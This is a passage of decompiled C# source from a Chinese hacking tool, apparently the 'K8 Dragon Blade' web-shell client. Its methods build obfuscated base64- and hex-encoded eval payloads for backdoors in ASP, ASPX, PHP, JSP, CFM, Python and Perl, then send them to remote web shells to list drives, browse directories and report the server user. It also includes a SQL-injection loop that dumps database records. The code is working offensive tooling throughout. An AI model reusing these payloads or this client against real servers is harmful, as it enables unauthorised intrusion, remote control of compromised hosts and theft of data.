                    request.Timeout = int.Parse(this.txt_TimeOutCmd.Text);
                    request.ProtocolVersion = HttpVersion.Version10;
                    request.Method = "POST";
                    byte[] bytes = new ASCIIEncoding().GetBytes(OnePostData);
                    request.ContentLength = bytes.Length;
                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    try
                    {
                        response2 = (HttpWebResponse) request.GetResponse();
                    }
                    catch (WebException exception2)
                    {
                        response2 = (HttpWebResponse) exception2.Response;
                        this.K8msgbox("异常：" + Convert.ToString((int) response2.StatusCode));
                    }
                    string input = "";
                    StreamReader reader = new StreamReader(response2.GetResponseStream(), Encoding.GetEncoding(int.Parse(this.K8ExecuteCmdCoding())));
                    string str3 = "";
                    string str4 = "";
                    while ((str3 = reader.ReadLine()) != null)
                    {
                        str4 = str4 + str3 + "\r\n";
                    }
                    input = "\r\n\r\n" + str4.Trim();
                    reader.Close();
                    if (k8type == 0)
                    {
                        Regex regex;
                        Match match;
                        this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                        if (this.rb_aspCmd.Checked | this.rb_aspxCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])[^\[\]]+(?=\t)");
                            match = regex.Match(input);
                            this.WebFileCurPath = match.Value.Trim();
                        }
                        else if (this.rb_phpCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)");
                            match = regex.Match(input);
                            this.WebFileCurPath = Search_string(input, "->|", "\t");
                            this.WebFileCurPath = this.WebFileCurPath.TrimEnd(new char[] { '/' }) + "/";
                            this.WebFileCurPath = this.WebFileCurPath.Replace("/", @"\\");
                            this.cbb_WebFilePath.Text = this.WebFileCurPath;
                            this.tv_dirList.Nodes.Clear();
                            string[] strArray = Search_string(input, "\t", ":\t").Split(new char[] { ':' });
                            foreach (string str6 in strArray)
                            {
                                TreeNode node = new TreeNode {
                                    Text = str6
                                };
                                this.tv_dirList.Nodes.Add(node);
                            }
                        }
                        else if (this.rb_jspCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)");
                            match = regex.Match(input);
                            this.WebFileCurPath = Search_string(input, "[S]", "[E]");
                        }
                        else if (this.rb_cfmCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])[^\[\]]+(?=\t)");
                            match = regex.Match(input);
                            this.WebFileCurPath = match.Value.Trim();
                        }
                        else if (this.rb_pythonCmd.Checked)
                        {
                            regex = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)");
                            match = regex.Match(input);
                            this.WebFileCurPath = Search_string(input, "[S]", "[E]");
                        }
                        else if (this.rb_perlCmd.Checked)
                        {
                            match = new Regex(@"(?<=[-][>][|])([.\S\s]*)(?=\t)").Match(input);
                            this.WebFileCurPath = Search_string(input, "[S]", "[E]");
                        }
                        if (this.WebFileCurPath != "")
                        {
                            this.btn_ExecuteWebCMD.Enabled = true;
                            this.txt_WebCmdResult.Enabled = true;
                            this.txt_WebCmdResult.AppendText("\r\n后门地址: " + this.txt_OneShellPath.Text.Trim() + "\r\n");
                            this.txt_WebCmdResult.AppendText("\r\n" + this.WebFileCurPath + ">");
                        }
                        else
                        {
                            this.btn_ExecuteWebCMD.Enabled = false;
                            this.txt_WebCmdResult.Enabled = false;
                            this.txt_WebCmdResult.AppendText("\r\nK8连接失败!");
                        }
                    }
                    else if (k8type == 1)
                    {
                        string str7 = "\r\n\r\n==============================================================================================================================\r\n\r\n";
                        string str8 = Search_string(input, "->|", "|<-");
                        string str9 = "";
                        if (((this.rb_aspCmd.Checked | this.rb_phpCmd.Checked) | this.rb_aspxCmd.Checked) | this.rb_cfmCmd.Checked)
                        {
                            if (str8.Contains("ERROR://"))
                            {
                                this.K8msgbox("错误: 路径错误或权限拒绝!");
                                return;
                            }
                            this.lv_DirList.Items.Clear();
                            string[] strArray3 = str8.Split(new char[] { '\n' });
                            foreach (string str11 in strArray3)
                            {
                                this.lv_DirList.Items.Add(new ListViewItem(str11.Trim(new char[] { '\r' }).Split(new char[] { '\t' })));
                            }
                        }
                        else if (this.rb_jspCmd.Checked)
                        {
                            str9 = Search_string(input, "->|", "|<-") + "\r\n" + this.WebFileCurPath + ">";
                        }
                        else if (this.rb_pythonCmd.Checked)
                        {
                            str9 = Search_string(input, "->|", "|<-") + "\r\n" + this.WebFileCurPath + ">";
                        }
                        else if (this.rb_perlCmd.Checked)
                        {
                            str9 = Search_string(input, "->|", "|<-") + "\r\n" + this.WebFileCurPath + ">";
                        }
                        if (input.Contains("ERROR://"))
                        {
                            this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                            this.txt_WebCmdResult.AppendText("\r\n" + str7 + str8 + str7 + this.WebFileCurPath + ">");
                        }
                        else
                        {
                            string str12 = input.Trim().ToUpper();
                            if (((str12.Contains("此命令的语法是") | str12.Contains("不是内部或外部命令")) | str12.Contains("net helpmsg")) | str12.Contains("拒绝访问"))
                            {
                                this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                                this.txt_WebCmdResult.AppendText(str8 + str7 + this.WebFileCurPath + ">");
                            }
                            else if ((str12.Contains("is not recognized as an internal or external command") | str12.Contains("the syntax of this command is")) | str12.Contains("access is denied"))
                            {
                                this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                                this.txt_WebCmdResult.AppendText(str8 + str7 + this.WebFileCurPath + ">");
                            }
                            else
                            {
                                this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                                this.txt_WebCmdResult.AppendText(str7 + str9);
                            }
                        }
                    }
                }
                catch (WebException exception3)
                {
                    this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                    response = (HttpWebResponse) exception3.Response;
                    if (response != null)
                    {
                        statusCode = (int) response.StatusCode;
                    }
                    if (statusCode != 200)
                    {
                        this.K8msgbox(statusCode.ToString());
                    }
                }
                catch (Exception exception6)
                {
                    exception = exception6;
                    this.txt_WebCmdResult.Text = this.txt_WebCmdResult.Text.Substring(0, this.txt_WebCmdResult.Text.Length - 6);
                    if (k8type == 0)
                    {
                        if (exception.ToString().Contains("(500) 内部服务器错误") | exception.ToString().Contains("(500) Internal Server Error"))
                        {
                            this.txt_WebCmdResult.AppendText("\r\nK8连接失败!\r\n\r\n1 密码错误");
                        }
                        else
                        {
                            this.txt_WebCmdResult.AppendText("\r\n没有返回内容");
                        }
                    }
                    else if ((k8type == 1) && exception.ToString().Contains("操作超时"))
                    {
                        this.txt_WebCmdResult.AppendText("\r\nK8操作超时");
                    }
                }
            }
        }

        private void K8_WebCMD()
        {
            string onePostData = "";
            if (this.rb_aspxCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(" + this.K8ExecuteCmdCoding() + ").GetString(System.Convert.FromBase64String(\"dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLldyaXRlKGNbaV1bMF0rIjoiKTs%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();";
            }
            else if (this.rb_aspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";
            }
            else if (this.rb_jspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            else if (this.rb_phpCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D";
            }
            else if (this.rb_cfmCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=A&z0=" + this.K8ExecuteCmdCoding();
            }
            else if (this.rb_pythonCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            else if (this.rb_perlCmd.Checked)
            {
                onePostData = "&" + this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            this.K8_PostExecuteCMD(onePostData, 0);
        }

        private void K8_WebFileDirList()
        {
            string onePostData = "";
            if (this.rb_aspxCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(" + this.K8ExecuteCmdCoding() + ").GetString(System.Convert.FromBase64String(\"dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLldyaXRlKGNbaV1bMF0rIjoiKTs%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();";
            }
            else if (this.rb_aspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";
            }
            else if (this.rb_jspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            else if (this.rb_phpCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=" + K8crack.K8UrlEncodeUTF8(K8crack.K8Base64(this.WebFileCurPath, 1));
            }
            else if (this.rb_cfmCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=A&z0=" + this.K8ExecuteCmdCoding();
            }
            else if (this.rb_pythonCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            else if (this.rb_perlCmd.Checked)
            {
                onePostData = "&" + this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            this.K8_PostFileManage(onePostData, 1);
        }

        private void K8_WebFileMgr()
        {
            string onePostData = "";
            if (this.rb_aspxCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(" + this.K8ExecuteCmdCoding() + ").GetString(System.Convert.FromBase64String(\"dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLldyaXRlKGNbaV1bMF0rIjoiKTs%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();";
            }
            else if (this.rb_aspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";
            }
            else if (this.rb_jspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            else if (this.rb_phpCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D";
            }
            else if (this.rb_cfmCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=A&z0=" + this.K8ExecuteCmdCoding();
            }
            else if (this.rb_pythonCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            else if (this.rb_perlCmd.Checked)
            {
                onePostData = "&" + this.txt_OneShellPwd.Text.Trim() + "=Szh0ZWFt";
            }
            this.K8_PostFileManage(onePostData, 0);
        }

        private string K8calcHoliday()
        {
            this.K8holidays();
            ChineseLunisolarCalendar calendar = new ChineseLunisolarCalendar();
            int month = calendar.GetMonth(DateTime.Now);
            int dayOfMonth = calendar.GetDayOfMonth(DateTime.Now);
            this.cnHoliday = this.Chinaholidays[month, dayOfMonth];
            DateTime now = DateTime.Now;
            int year = now.Year;
            int num4 = now.Month;
            int day = now.Day;
            string str = " " + year.ToString() + "年" + num4.ToString() + "月" + day.ToString() + "日 ";
            this.enHoliday = this.holidays[num4, day];
            if ((this.cnHoliday != null) && (this.enHoliday != null))
            {
                return (str + "双重节日 (" + this.cnHoliday + " 和 " + this.enHoliday + ")");
            }
            if ((this.cnHoliday == null) && (this.enHoliday == null))
            {
                return "";
            }
            if (this.cnHoliday != null)
            {
                if (dayOfMonth.ToString().Length != 2)
                {
                    str = str + "农历" + month.ToString() + "月初" + dayOfMonth.ToString() + "-" + this.cnHoliday;
                }
                else
                {
                    str = str + "农历" + month.ToString() + "月" + dayOfMonth.ToString() + "-" + this.cnHoliday;
                }
            }
            if (this.enHoliday != null)
            {
                str = str + " " + this.enHoliday;
            }
            return str;
        }

        private static string k8calcPercent(string ALLCount, string MinCount)
        {
            return (Math.Round((double) ((Convert.ToDouble(MinCount) / Convert.ToDouble(ALLCount)) * 100.0), 2).ToString() + "%");
        }

        private void K8checkUpdate()
        {
            string s = Search_string(this.K8WebClientGetHtml("http://qqhack8.blog.163.com/blog/static/1141479852013421738391/", "UTF-8"), "[K8 Dragon Blade Start]", "[K8 Dragon Blade Finish]");
            string str2 = Search_string(s, "Version=", "Bulid=");
            string str3 = Search_string(s, "Bulid=", "DownloadURL=");
            string str4 = Search_string(s, "DownloadURL=", "[E]");
            int num = 0;
            try
            {
                num = int.Parse(str3);
            }
            catch (Exception)
            {
                num = 0x132de3f;
            }
            if (num > this.K8BuildDateInt)
            {
                this.K8msgbox("发现新版本 : " + str3);
                K8OpenURL(str4);
            }
            else
            {
                this.K8msgbox("当前已是最新版本");
            }
        }

        public void K8createTabExpBtn()
        {
            this.tab_webExp.TabPages.Clear();
            string str = "";
            string text = "";
            string str3 = "";
            string str4 = "";
            DataSet appNameDataSet = BLLk8EXP.GetAppNameDataSet();
            foreach (DataRow row in appNameDataSet.Tables[0].Rows)
            {
                text = row["appName"].ToString();
                TabPage page = null;
                page = new TabPage(text) {
                    Name = "tab_" + text
                };
                this.tab_webExp.Controls.Add(page);
            }
            int count = 0;
            int num2 = 0;
            int num3 = 0;
            string str5 = "k8app";
            DataSet dataSet = BLLk8EXP.GetDataSet();
            foreach (DataRow row2 in dataSet.Tables[0].Rows)
            {
                str = row2["id"].ToString();
                text = row2["appName"].ToString();
                str3 = row2["btnName"].ToString();
                str4 = row2["btnTip"].ToString();
                str3 = K8crack.K8expBase64(str3, 0);
                str4 = K8crack.K8expBase64(str4, 0);
                if (text != str5)
                {
                    str5 = text;
                    num2 = 0;
                    num3 = 0;
                }
                count = this.tab_webExp.TabPages["tab_" + text].Controls.Count;
                this.tab_webExp.TabPages["tab_" + text].Text = text + " (" + ((count + 1)).ToString() + ")";
                num2 = count - (num3 * 5);
                Button control = new Button {
                    Name = "k8ExpBtn_" + str,
                    Text = str3,
                    Width = 0xc2,
                    Left = 8 + (num2 * 0xca),
                    Top = 8 + (num3 * 30),
                    ContextMenuStrip = this.rm_ExpMgrBtn
                };
                if (num2 >= 5)
                {
                    num2 = 0;
                    num3++;
                    control.Top = 8 + (num3 * 30);
                    control.Left = 8;
                }
                new ToolTip { ShowAlways = true }.SetToolTip(control, str4);
                control.Click += new EventHandler(this.K8EXP_click);
                this.tab_webExp.TabPages["tab_" + text].Controls.Add(control);
            }
        }

        private void K8DataOutOne()
        {
            if (this.txt_urlDataOutput.Text.Trim() == "")
            {
                MessageBox.Show("请先输入URL");
            }
            else if (this.txt_sqlDataOutput.Text.Trim() == "")
            {
                MessageBox.Show("请先输入exp语句");
            }
            else
            {
                this.txt_resultDataOut.Text = "";
                this.K8AbortScan = false;
                this.btn_DataOutput.Enabled = false;
                this.btn_dataOutputMul.Enabled = false;
                this.btn_OutDataStop.Enabled = true;
                int num = 0;
                string str = this.txt_dataOutstartStr.Text.Trim();
                string endStr = this.txt_dataOutEndStr.Text.Trim();
                int num2 = int.Parse(this.txt_minnum.Text.Trim());
                int num3 = int.Parse(this.txt_maxnum.Text.Trim());
                string encoding = this.K8webBrowserEncoding(this.cbb_DataOutEncoding.Text.Trim().ToUpper());
                this.K8saveOutDataIni();
                WriteLogHelper.m_fileName = @"\DataOutput\" + GetURLDomain(this.txt_urlDataOutput.Text.Trim()) + "_data.txt";
                DateTime time = this.K8startTimeDataOut();
                for (int i = num2; i <= num3; i++)
                {
                    string strRegex;
                    string str10;
                    if (this.K8AbortScan)
                    {
                        this.btn_DataOutput.Enabled = true;
                        this.btn_dataOutputMul.Enabled = true;
                        this.btn_OutDataStop.Enabled = false;
                        this.K8endTimeDataOut(i, time);
                        break;
                    }
                    string url = this.txt_urlDataOutput.Text.Trim();
                    string postString = this.txt_sqlDataOutput.Text.Trim();
                    string str7 = "";
                    if (this.rb_GetDataOut.Checked)
                    {
                        url = (this.txt_urlDataOutput.Text.Trim() + this.txt_sqlDataOutput.Text.Trim()).Replace("$var$", i.ToString());
                        str7 = this.K8WebClientGetHtml(url, encoding);
                    }
                    else
                    {
                        postString = postString.Replace("$var$", i.ToString());
                        str7 = K8WebClientPostHtml(url, postString, encoding);
                    }
                    if (this.chk_DataOutRegex.Checked)
                    {
                        string regexStr = this.txt_dataOutRegex.Text.Trim();
                        strRegex = this.GetStrRegex(str7, regexStr);
                        if (strRegex != "")
                        {
                            num++;
                            str10 = "第" + i.ToString() + "条 " + strRegex + "\r\n\r\n";
                            this.txt_resultDataOut.AppendText(str10);
                            this.lbl_found.Text = "有效:" + num.ToString();
                            WriteLogHelper.WriteError(strRegex);
                        }
                        else
                        {
                            this.txt_resultDataOut.AppendText("第" + i.ToString() + "条 \r\n\r\n");
                        }
                    }
                    else if ((str == "") && (endStr == ""))
                    {
                        this.txt_resultDataOut.AppendText("第" + i.ToString() + "条 " + str7 + "\r\n\r\n");
                    }
                    else if ((str != "") && str7.Contains(str))
                    {
                        num++;
                        strRegex = this.GetMidStr(str7, str, endStr);
                        str10 = "第" + i.ToString() + "条 " + strRegex + "\r\n\r\n";
                        this.txt_resultDataOut.AppendText(str10);
                        this.lbl_found.Text = "有效:" + num.ToString();
                        WriteLogHelper.WriteError(strRegex);
                    }
                    else
                    {
                        this.txt_resultDataOut.AppendText("第" + i.ToString() + "条 \r\n\r\n");
                    }
                    this.lbl_check.Text = "检测:" + i.ToString();
                    if (i == num3)
                    {
                        this.btn_DataOutput.Enabled = true;
                        this.btn_dataOutputMul.Enabled = true;
                        this.btn_OutDataStop.Enabled = false;
                        this.K8endTimeDataOut(num3, time);
                        break;
                    }
                }
            }
        }

        public void K8dataOutputMul(object li)
        {
            List<string> list = li as List<string>;
            string url = list[0];
            string str2 = list[1];
            string str3 = list[2];
            DateTime time = Convert.ToDateTime(list[3]);
            this.i = int.Parse(str2.ToString());
            int num = int.Parse(this.txt_minnum.Text.Trim());
            string str4 = this.txt_dataOutstartStr.Text.Trim();
            string endStr = this.txt_dataOutEndStr.Text.Trim();
            string encoding = this.K8webBrowserEncoding(this.cbb_DataOutEncoding.Text.Trim().ToUpper());
            WriteLogHelper.m_fileName = str3;
            if (this.K8AbortScan)
            {
                this.btn_DataOutput.Enabled = true;
                this.btn_dataOutputMul.Enabled = true;
                this.btn_OutDataStop.Enabled = false;
            }
            else
            {
                string strRegex;
                string str11;
                string postString = this.txt_sqlDataOutput.Text.Trim();
                string str = "";
                if (this.rb_GetDataOut.Checked)
                {
                    url = (this.txt_urlDataOutput.Text.Trim() + this.txt_sqlDataOutput.Text.Trim()).Replace("$var$", this.i.ToString());
                    str = this.K8WebClientGetHtml(url, encoding);
                }
                else
                {
                    postString = postString.Replace("$var$", this.i.ToString());
                    str = K8WebClientPostHtml(url, postString, encoding);
                }
                if (this.chk_DataOutRegex.Checked)
                {
                    string regexStr = this.txt_dataOutRegex.Text.Trim();
                    strRegex = this.GetStrRegex(str, regexStr);
                    if (strRegex != "")
                    {
                        this.k8foundmul++;
                        str11 = "第" + this.i.ToString() + "条 " + strRegex + "\r\n\r\n";
                        this.txt_resultDataOut.AppendText(str11);
                        this.lbl_found.Text = "有效:" + this.k8foundmul.ToString();
                        WriteLogHelper.WriteError(strRegex);
                    }
                    else
                    {
                        this.txt_resultDataOut.AppendText("第" + this.i.ToString() + "条 \r\n\r\n");
                    }
                }
                else if ((str4 == "") && (endStr == ""))
                {
                    this.txt_resultDataOut.AppendText("第" + this.i.ToString() + "条 " + str + "\r\n\r\n");
                }
                else if ((str4 != "") && str.Contains(str4))
                {
                    strRegex = this.GetMidStr(str, str4, endStr).Trim();
                    str11 = "第" + this.i.ToString() + "条 " + strRegex + "\r\n\r\n";
                    this.txt_resultDataOut.AppendText(str11);
                    this.k8foundmul++;
                    this.lbl_found.Text = "有效:" + this.k8foundmul.ToString();
                    WriteLogHelper.WriteError(strRegex);
                }
                else
                {
                    this.txt_resultDataOut.AppendText("第" + this.i.ToString() + "条 \r\n\r\n");
                }
                this.lbl_check.Text = "检测:" + this.i.ToString();
            }
        }

        private void K8debugTest()
        {
            this.txt_k8url.Text = "http://192.168.85.142/php/1.php";
            this.txt_ScanAdminURL.Text = "http://qqhack8.blog.163.com/";
        }

        private void K8endTimeDataOut(int k8count, DateTime K8StartTime)
        {
            this.AllowScanAdminControl();
            this.txt_resultDataOut.AppendText("脱库完毕!");
            DateTime now = DateTime.Now;
            TimeSpan span = new TimeSpan(0, 0, 0);
            span = (TimeSpan) (now - K8StartTime);
            double num2 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalSeconds.ToString())));
            double num3 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalMinutes)));
            double num4 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalHours)));
            StringBuilder builder = new StringBuilder();
            builder.Append(" 使用: " + num2.ToString() + " 秒 == ");
